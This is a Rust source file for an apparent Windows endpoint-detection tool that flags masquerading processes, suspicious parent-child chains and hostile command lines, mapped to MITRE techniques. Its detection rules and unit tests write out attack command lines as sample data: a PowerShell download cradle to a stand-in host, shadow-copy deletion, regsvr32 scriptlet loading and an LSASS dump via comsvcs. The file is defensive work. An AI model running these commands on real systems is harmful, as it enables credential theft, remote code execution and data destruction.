//! Process-level heuristics: masquerading, wrong path, wrong parent, suspicious command lines.

use super::paths::{edit_distance, file_name, normalize, suspicious_dir};
use super::report::{Category, Finding, Severity};
use super::{ProcInfo, SigStatus};

struct SysProc {
    name: &'static str,
    dirs: &'static [&'static str],
    /// Expected parent image names. Empty = do not check. A parent that no longer exists is accepted.
    parents: &'static [&'static str],
    single: bool,
}

const S32: &[&str] = &["c:\\windows\\system32\\"];
const S32_WOW: &[&str] = &["c:\\windows\\system32\\", "c:\\windows\\syswow64\\"];

const SYSTEM_PROCS: &[SysProc] = &[
    SysProc { name: "smss.exe", dirs: S32, parents: &["system", "smss.exe"], single: false },
    SysProc { name: "csrss.exe", dirs: S32, parents: &["smss.exe"], single: false },
    SysProc { name: "wininit.exe", dirs: S32, parents: &["smss.exe"], single: true },
    SysProc { name: "winlogon.exe", dirs: S32, parents: &["smss.exe"], single: false },
    SysProc { name: "services.exe", dirs: S32, parents: &["wininit.exe"], single: true },
    SysProc { name: "lsass.exe", dirs: S32, parents: &["wininit.exe"], single: true },
    SysProc { name: "lsaiso.exe", dirs: S32, parents: &["wininit.exe"], single: true },
    SysProc { name: "svchost.exe", dirs: S32_WOW, parents: &["services.exe", "msmpeng.exe"], single: false },
    SysProc { name: "spoolsv.exe", dirs: S32, parents: &["services.exe"], single: true },
    SysProc { name: "searchindexer.exe", dirs: S32, parents: &["services.exe"], single: false },
    SysProc { name: "taskhostw.exe", dirs: S32, parents: &["svchost.exe"], single: false },
    SysProc { name: "runtimebroker.exe", dirs: S32, parents: &["svchost.exe"], single: false },
    SysProc { name: "sihost.exe", dirs: S32, parents: &["svchost.exe"], single: false },
    SysProc { name: "smartscreen.exe", dirs: S32, parents: &["svchost.exe"], single: false },
    SysProc { name: "dllhost.exe", dirs: S32_WOW, parents: &["svchost.exe", "services.exe"], single: false },
    SysProc { name: "userinit.exe", dirs: S32, parents: &["winlogon.exe"], single: false },
    SysProc { name: "dwm.exe", dirs: S32, parents: &["winlogon.exe"], single: false },
    SysProc { name: "fontdrvhost.exe", dirs: S32, parents: &["wininit.exe", "winlogon.exe"], single: false },
    SysProc {
        name: "wmiprvse.exe",
        dirs: &["c:\\windows\\system32\\wbem\\", "c:\\windows\\syswow64\\wbem\\"],
        parents: &["svchost.exe"],
        single: false,
    },
    SysProc { name: "explorer.exe", dirs: &["c:\\windows\\"], parents: &[], single: false },
    SysProc { name: "conhost.exe", dirs: S32, parents: &[], single: false },
    SysProc { name: "ctfmon.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc { name: "taskmgr.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc { name: "cmd.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc {
        name: "powershell.exe",
        dirs: &["c:\\windows\\system32\\windowspowershell\\v1.0\\", "c:\\windows\\syswow64\\windowspowershell\\v1.0\\"],
        parents: &[],
        single: false,
    },
    SysProc { name: "rundll32.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc { name: "regsvr32.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc { name: "mshta.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc { name: "wscript.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc { name: "cscript.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc { name: "werfault.exe", dirs: S32_WOW, parents: &[], single: false },
    SysProc { name: "notepad.exe", dirs: &["c:\\windows\\system32\\", "c:\\windows\\syswow64\\", "c:\\windows\\", "c:\\program files\\windowsapps\\"], parents: &[], single: false },
];

const OFFICE: &[&str] = &[
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "onenote.exe", "msaccess.exe", "mspub.exe", "visio.exe",
    "acrord32.exe", "acrobat.exe", "foxitpdfreader.exe", "hwp.exe", "wps.exe", "et.exe", "wpp.exe",
];
const SERVERS: &[&str] = &["w3wp.exe", "httpd.exe", "nginx.exe", "tomcat.exe", "tomcat9.exe", "java.exe", "sqlservr.exe", "php-cgi.exe", "umworkerprocess.exe"];
const SHELLS: &[&str] = &[
    "cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
    "certutil.exe", "bitsadmin.exe", "schtasks.exe", "wmic.exe", "msbuild.exe", "installutil.exe", "regasm.exe",
    "regsvcs.exe", "msiexec.exe", "curl.exe", "whoami.exe", "net.exe", "net1.exe", "nltest.exe",
];
/// Real binaries whose names are within edit distance of a system process.
const LEGIT_LOOKALIKES: &[&str] = &[
    "taskhost.exe", "taskhostex.exe", "iexplore.exe", "sihclient.exe", "smartscreensettings.exe", "conhost.exe",
    "svchost.exe", "dllhst3g.exe", "lsm.exe", "wsqmcons.exe", "wermgr.exe", "spoolss.exe",
    // Added in v0.3.0 after live-host false positives (see CHANGELOG).
    "dashost.exe",      // Device Association Service Host, Microsoft-signed
    "wmphost.exe",      // Windows Media Player sharing
    "upfc.exe",         // Updater runtime
    "msoia.exe",        // Office IntelligentActionService
    "cmdhost.exe",      // Windows legitimate command host
];
const SCRIPT_HOSTS: &[&str] = &["wscript.exe", "cscript.exe", "mshta.exe"];

fn is_one_of(name: &str, list: &[&str]) -> bool {
    list.contains(&name)
}

/// Homoglyph fold: digits that look like letters.
fn fold(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            '0' => 'o',
            '1' | 'i' => 'l',
            '5' => 's',
            _ => c,
        })
        .collect()
}

pub fn analyze(p: &ProcInfo, parent: Option<&ProcInfo>, instances: usize) -> Vec<Finding> {
    let mut out = Vec::new();
    let name = p.name.to_ascii_lowercase();
    let mk = |sev, title: &str| Finding::new(sev, Category::Process, title).proc(p.pid, &p.name);

    if p.pid <= 4 {
        return out;
    }

    // 1. Known system binary: path, parent, instance count.
    if let Some(sp) = SYSTEM_PROCS.iter().find(|s| s.name == name) {
        if let Some(path) = &p.path {
            let n = normalize(path);
            let dir_ok = sp.dirs.iter().any(|d| n.starts_with(d) && !n[d.len()..].contains('\\'));
            if !dir_ok {
                out.push(
                    mk(Severity::High, "System binary name running from unexpected location")
                        .path(path.clone())
                        .detail(format!("expected in {}", sp.dirs.join(" or ")))
                        .mitre(&["T1036.005"]),
                );
            }
        }
        if !sp.parents.is_empty() {
            if let Some(par) = parent {
                let pn = par.name.to_ascii_lowercase();
                if !sp.parents.contains(&pn.as_str()) {
                    out.push(
                        mk(Severity::High, "System process has unexpected parent")
                            .detail(format!("parent: {} [pid {}], expected: {}", par.name, par.pid, sp.parents.join("/")))
                            .mitre(&["T1036", "T1134.004"]),
                    );
                }
            }
        }
        if sp.single && instances > 1 {
            out.push(
                mk(Severity::High, "Multiple instances of a single-instance system process")
                    .detail(format!("{instances} instances of {}", sp.name))
                    .mitre(&["T1036.005"]),
            );
        }
    } else {
        // 2. Look-alike names (scvhost.exe, lsasss.exe, svch0st.exe).
        let stem = name.trim_end_matches(".exe");
        if stem.len() >= 4 && !LEGIT_LOOKALIKES.contains(&name.as_str()) {
            for sp in SYSTEM_PROCS {
                let sstem = sp.name.trim_end_matches(".exe");
                let d = edit_distance(stem, sstem);
                let homoglyph = fold(stem) == fold(sstem);
                let limit = if sstem.len() >= 7 { 2 } else { 1 };
                let len_close = stem.len().abs_diff(sstem.len()) <= 1;
                // "explorer64", "notepad++": a system name plus a non-letter suffix is a different product.
                let versioned = stem.strip_prefix(sstem).is_some_and(|rest| !rest.is_empty() && !rest.chars().any(|c| c.is_ascii_alphabetic()));
                if homoglyph || (d > 0 && d <= limit && len_close && !versioned) {
                    out.push(
                        mk(Severity::High, "Process name imitates a Windows binary")
                            .detail(format!("'{}' looks like '{}'", p.name, sp.name))
                            .mitre(&["T1036.005"]),
                    );
                    break;
                }
            }
        }
    }

    // 3. Suspicious parent -> child.
    if let Some(par) = parent {
        let pn = par.name.to_ascii_lowercase();
        let pd = format!("parent: {} [pid {}]", par.name, par.pid);
        if is_one_of(&pn, OFFICE) && is_one_of(&name, SHELLS) {
            out.push(mk(Severity::High, "Document reader spawned a shell / LOLBin").detail(pd).mitre(&["T1204.002", "T1059"]));
        } else if is_one_of(&pn, SERVERS) && is_one_of(&name, SHELLS) {
            out.push(mk(Severity::High, "Server process spawned a shell (possible web shell)").detail(pd).mitre(&["T1505.003"]));
        } else if pn == "lsass.exe" {
            out.push(mk(Severity::High, "Child process of lsass.exe").detail(pd).mitre(&["T1055", "T1003.001"]));
        } else if pn == "wmiprvse.exe" && is_one_of(&name, SHELLS) {
            out.push(mk(Severity::Medium, "Shell spawned by WMI provider host").detail(pd).mitre(&["T1047"]));
        } else if is_one_of(&pn, SCRIPT_HOSTS) && is_one_of(&name, SHELLS) {
            out.push(mk(Severity::High, "Script host spawned a shell / LOLBin").detail(pd).mitre(&["T1059.005", "T1059.007"]));
        } else if pn == "services.exe" && is_one_of(&name, &["cmd.exe", "powershell.exe", "pwsh.exe", "mshta.exe", "rundll32.exe"]) {
            out.push(mk(Severity::Medium, "Shell launched directly as a service").detail(pd).mitre(&["T1543.003", "T1569.002"]));
        }
    }

    // 4. Command line.
    if let Some(cmd) = &p.cmdline {
        out.extend(cmdline_findings(&name, cmd).into_iter().map(|f| f.proc(p.pid, &p.name)));
    }

    // 5. Image location and signature.
    if let Some(path) = &p.path {
        let susp = suspicious_dir(path);
        match (&p.signature, susp) {
            (Some(SigStatus::Invalid(why)), _) => out.push(
                mk(Severity::High, "Process image has an invalid signature")
                    .path(path.clone())
                    .detail(why.clone())
                    .mitre(&["T1553.002"]),
            ),
            (Some(SigStatus::Unsigned), Some(why)) => out.push(
                mk(Severity::High, "Unsigned process running from a user-writable location")
                    .path(path.clone())
                    .detail(why)
                    .mitre(&["T1204.002"]),
            ),
            (_, Some(why)) => {
                out.push(mk(Severity::Medium, "Process running from a user-writable location").path(path.clone()).detail(why))
            }
            (Some(SigStatus::Unsigned), None) => {
                let n = normalize(path);
                if !n.starts_with("c:\\program files") {
                    out.push(mk(Severity::Low, "Unsigned process image").path(path.clone()));
                }
            }
            _ => {}
        }
        if !p.image_exists {
            out.push(
                mk(Severity::High, "Process image no longer exists on disk")
                    .path(path.clone())
                    .detail("deleted after launch, or launched from a transacted / ghosted file")
                    .mitre(&["T1070.004", "T1055.013"]),
            );
        }
    }
    out
}

/// Heuristics on a command line. `image` is the lowercase file name of the program.
pub fn cmdline_findings(image: &str, cmd: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let l = cmd.to_ascii_lowercase();
    let image = file_name(image).to_ascii_lowercase();
    let mk = |sev, title: &str, mitre: &[&'static str]| {
        Finding::new(sev, Category::Process, title).detail(format!("cmdline: {}", truncate(cmd, 400))).mitre(mitre)
    };
    let has = |s: &str| l.contains(s);

    match image.as_str() {
        "powershell.exe" | "pwsh.exe" | "powershell_ise.exe" => {
            if let Some(decoded) = powershell_encoded(cmd) {
                let mut f = mk(Severity::High, "PowerShell with encoded command", &["T1059.001", "T1027"]);
                f.details.push(format!("decoded: {}", truncate(&decoded, 600)));
                out.push(f);
                out.extend(powershell_body(&decoded.to_ascii_lowercase(), cmd));
            }
            out.extend(powershell_body(&l, cmd));
            if (has("-w hidden") || has("-windowstyle hidden") || has("-win hidden") || has("-w 1 ")) && (has("-nop") || has("-noni")) {
                out.push(mk(Severity::Medium, "Hidden non-interactive PowerShell", &["T1059.001", "T1564.003"]));
            }
        }
        "mshta.exe" if has("http:") || has("https:") || has("javascript:") || has("vbscript:") => {
            out.push(mk(Severity::High, "mshta executing remote or inline script", &["T1218.005"]));
        }
        "rundll32.exe" => {
            let args = super::paths::split_args(cmd);
            if args.len() <= 1 {
                out.push(mk(
                    Severity::High,
                    "rundll32.exe running without arguments (typical injection sacrificial process)",
                    &["T1055", "T1218.011"],
                ));
            } else if has("javascript:") || has("mshtml,runhtmlapplication") {
                out.push(mk(Severity::High, "rundll32 executing script", &["T1218.011"]));
            } else if has("comsvcs") && has("minidump") {
                out.push(mk(Severity::Critical, "LSASS dump via comsvcs.dll MiniDump", &["T1003.001"]));
            } else if let Some(t) = super::paths::command_target(cmd) {
                if let Some(why) = suspicious_dir(&t) {
                    out.push(mk(Severity::High, "rundll32 loading a DLL from a user-writable location", &["T1218.011"]).detail(why));
                }
            }
        }
        "regsvr32.exe" if has("/i:http") || has("-i:http") || has("scrobj") => {
            out.push(mk(Severity::High, "regsvr32 scriptlet execution (Squiblydoo)", &["T1218.010"]));
        }
        "certutil.exe" if (has("urlcache") || has("verifyctl")) && (has("http:") || has("https:")) => {
            out.push(mk(Severity::High, "certutil used to download a file", &["T1105"]));
        }
        "certutil.exe" if has("-decode") || has("/decode") => {
            out.push(mk(Severity::Medium, "certutil used to decode a file", &["T1140"]));
        }
        "bitsadmin.exe" if has("/transfer") || has("/addfile") || has("/setnotifycmdline") => {
            out.push(mk(Severity::Medium, "bitsadmin download or job abuse", &["T1197"]));
        }
        "vssadmin.exe" if has("delete shadows") || has("resize shadowstorage") => {
            out.push(mk(Severity::Critical, "Shadow copy deletion (ransomware behaviour)", &["T1490"]));
        }
        "wmic.exe" if has("shadowcopy") && has("delete") => {
            out.push(mk(Severity::Critical, "Shadow copy deletion via WMIC", &["T1490"]));
        }
        "wmic.exe" if has("process call create") => {
            out.push(mk(Severity::Medium, "WMIC process creation", &["T1047"]));
        }
        "wbadmin.exe" if has("delete catalog") || has("delete systemstatebackup") || has("delete backup") => {
            out.push(mk(Severity::Critical, "Backup catalog deletion", &["T1490"]));
        }
        "bcdedit.exe" if has("recoveryenabled no") || has("ignoreallfailures") => {
            out.push(mk(Severity::Critical, "Boot recovery disabled", &["T1490"]));
        }
        "reg.exe" if has("save") && (has("hklm\\sam") || has("hklm\\security") || has("hklm\\system")) => {
            out.push(mk(Severity::High, "Registry hive dump (SAM/SECURITY/SYSTEM)", &["T1003.002"]));
        }
        "procdump.exe" | "procdump64.exe" if has("lsass") => {
            out.push(mk(Severity::Critical, "LSASS memory dump", &["T1003.001"]));
        }
        "netsh.exe" if has("portproxy") => out.push(mk(Severity::Medium, "netsh port proxy configured", &["T1090"])),
        "netsh.exe" if has("firewall") && (has("state off") || has("disable")) => {
            out.push(mk(Severity::Medium, "Firewall disabled via netsh", &["T1562.004"]))
        }
        "installutil.exe" if has("/u") || has("/logfile=") => {
            out.push(mk(Severity::Medium, "InstallUtil proxy execution", &["T1218.004"]))
        }
        "msbuild.exe" => {
            if let Some(t) = super::paths::split_args(cmd).iter().skip(1).find(|a| !a.starts_with(['/', '-'])) {
                if suspicious_dir(t).is_some() {
                    out.push(mk(Severity::High, "MSBuild building a project from a user-writable location", &["T1127.001"]));
                }
            }
        }
        "svchost.exe" if !has(" -k ") && !has(" /k ") => {
            out.push(mk(Severity::High, "svchost.exe without -k service group", &["T1036.005", "T1055"]));
        }
        "cmd.exe" if has("\\\\.\\pipe\\") && has("echo") => {
            out.push(mk(Severity::High, "cmd echoing into a named pipe (getsystem-style impersonation)", &["T1134.001"]));
        }
        "schtasks.exe" if has("/create") => {
            if let Some(i) = l.find("/tr") {
                let tr = &cmd[i..];
                if suspicious_dir(tr).is_some() || tr.to_ascii_lowercase().contains("powershell") {
                    out.push(mk(Severity::Medium, "Scheduled task created with a suspicious action", &["T1053.005"]));
                }
            }
        }
        _ => {}
    }
    out
}

fn powershell_body(l: &str, cmd: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let mk = |sev, title: &str, mitre: &[&'static str]| {
        Finding::new(sev, Category::Process, title).detail(format!("cmdline: {}", truncate(cmd, 400))).mitre(mitre)
    };
    let has = |s: &str| l.contains(s);
    let download = has("downloadstring") || has("downloaddata") || has("downloadfile") || has("net.webclient")
        || has("invoke-webrequest") || has("iwr ") || has("start-bitstransfer") || has("invoke-restmethod") || has("irm ");
    let exec = has("iex") || has("invoke-expression") || has("|iex") || has(".invoke(");
    if download && exec {
        out.push(mk(Severity::High, "PowerShell download cradle", &["T1059.001", "T1105"]));
    }
    if has("amsiutils") || has("amsiinitfailed") || has("amsicontext") || has("amsiscanbuffer") {
        out.push(mk(Severity::Critical, "PowerShell AMSI bypass", &["T1562.001"]));
    }
    if has("virtualalloc") && (has("getdelegateforfunctionpointer") || has("createthread")) {
        out.push(mk(Severity::High, "PowerShell in-memory shellcode loader", &["T1059.001", "T1055"]));
    }
    if has("system.reflection.assembly") && has("load(") {
        out.push(mk(Severity::Medium, "PowerShell reflective .NET assembly load", &["T1620"]));
    }
    if has("set-mppreference") && (has("disable") || has("exclusion")) {
        out.push(mk(Severity::High, "Defender settings tampered via PowerShell", &["T1562.001"]));
    }
    if has("frombase64string") && (has("gzipstream") || has("deflatestream")) {
        out.push(mk(Severity::Medium, "PowerShell compressed base64 payload", &["T1027"]));
    }
    out
}

/// If the command line uses -EncodedCommand (any accepted abbreviation), decode it (UTF-16LE base64).
pub fn powershell_encoded(cmd: &str) -> Option<String> {
    let args = super::paths::split_args(cmd);
    let mut it = args.iter().skip(1);
    while let Some(a) = it.next() {
        let a = a.to_ascii_lowercase();
        let flag = a.trim_start_matches(['-', '/']);
        let is_flag = a.starts_with(['-', '/']);
        let enc = is_flag && (flag == "ec" || (flag.len() >= 1 && "encodedcommand".starts_with(flag) && flag.starts_with('e')));
        // -e alone is ambiguous with -ExecutionPolicy in old PowerShell, but -ep / -ex are the policy forms.
        if enc && !flag.starts_with("ex") && !flag.starts_with("ep") {
            let b64 = it.next()?;
            let raw = base64_decode(b64)?;
            let u16s: Vec<u16> = raw.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
            return Some(String::from_utf16_lossy(&u16s));
        }
    }
    None
}

pub fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let mut buf = 0u32;
    let mut bits = 0;
    for c in s.bytes() {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            b' ' | b'\r' | b'\n' => continue,
            _ => return None,
        } as u32;
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
        }
    }
    (!out.is_empty()).then_some(out)
}

pub fn truncate(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        s.to_string()
    } else {
        let t: String = s.chars().take(n).collect();
        format!("{t}...")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn proc(pid: u32, name: &str, path: &str, cmd: &str) -> ProcInfo {
        ProcInfo {
            pid,
            ppid: 0,
            name: name.into(),
            path: Some(path.into()),
            cmdline: Some(cmd.into()),
            signature: None,
            image_exists: true,
            ..Default::default()
        }
    }

    fn titles(v: &[Finding]) -> Vec<String> {
        v.iter().map(|f| f.title.clone()).collect()
    }

    #[test]
    fn detects_wrong_path() {
        let p = proc(100, "svchost.exe", r"C:\Users\Public\svchost.exe", "svchost.exe -k netsvcs");
        let f = analyze(&p, None, 1);
        assert!(titles(&f).iter().any(|t| t.contains("unexpected location")));
    }

    #[test]
    fn legit_svchost_clean() {
        let p = proc(100, "svchost.exe", r"C:\Windows\System32\svchost.exe", r"C:\Windows\system32\svchost.exe -k netsvcs -p");
        let parent = proc(50, "services.exe", r"C:\Windows\System32\services.exe", "");
        assert!(analyze(&p, Some(&parent), 1).is_empty());
    }

    #[test]
    fn detects_lookalike() {
        let p = proc(100, "scvhost.exe", r"C:\Windows\scvhost.exe", "");
        assert!(titles(&analyze(&p, None, 1)).iter().any(|t| t.contains("imitates")));
        let p = proc(101, "lsasss.exe", r"C:\Windows\lsasss.exe", "");
        assert!(titles(&analyze(&p, None, 1)).iter().any(|t| t.contains("imitates")));
        let p = proc(102, "svch0st.exe", r"C:\Windows\svch0st.exe", "");
        assert!(titles(&analyze(&p, None, 1)).iter().any(|t| t.contains("imitates")));
        for legit in ["notepad++.exe", "iexplore.exe", "taskhost.exe", "explorer64.exe", "services64.exe"] {
            let p = proc(104, legit, r"C:\Program Files\x\x.exe", "");
            assert!(!titles(&analyze(&p, None, 1)).iter().any(|t| t.contains("imitates")), "{legit}");
        }
        let p = proc(103, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe");
        assert!(analyze(&p, None, 1).is_empty());
    }

    #[test]
    fn detects_office_child() {
        let p = proc(200, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe");
        let parent = proc(150, "WINWORD.EXE", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "");
        assert!(titles(&analyze(&p, Some(&parent), 1)).iter().any(|t| t.contains("Document reader")));
    }

    #[test]
    fn decodes_encoded_powershell() {
        // "IEX (New-Object Net.WebClient).DownloadString('http://x')" UTF-16LE base64
        let script = "IEX (New-Object Net.WebClient).DownloadString('http://x')";
        let utf16: Vec<u8> = script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = encode(&utf16);
        let cmd = format!("powershell.exe -nop -w hidden -enc {b64}");
        assert_eq!(powershell_encoded(&cmd).unwrap(), script);
        let t = titles(&cmdline_findings("powershell.exe", &cmd));
        assert!(t.iter().any(|x| x.contains("encoded")));
        assert!(t.iter().any(|x| x.contains("download cradle")));
        assert!(t.iter().any(|x| x.contains("Hidden")));
        assert!(powershell_encoded("powershell.exe -ExecutionPolicy Bypass -File a.ps1").is_none());
        assert!(powershell_encoded("powershell.exe -ep bypass x").is_none());
    }

    #[test]
    fn lolbins() {
        assert!(!cmdline_findings("rundll32.exe", "rundll32.exe").is_empty());
        assert!(!cmdline_findings("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet").is_empty());
        assert!(!cmdline_findings("regsvr32.exe", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll").is_empty());
        assert!(!cmdline_findings("rundll32.exe", r"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full").is_empty());
        assert!(cmdline_findings("rundll32.exe", r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL").is_empty());
    }

    fn encode(b: &[u8]) -> String {
        const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut s = String::new();
        for c in b.chunks(3) {
            let n = (c[0] as u32) << 16 | (*c.get(1).unwrap_or(&0) as u32) << 8 | *c.get(2).unwrap_or(&0) as u32;
            for i in 0..4 {
                if i <= c.len() {
                    s.push(T[(n >> (18 - 6 * i) & 63) as usize] as char);
                } else {
                    s.push('=');
                }
            }
        }
        s
    }
}
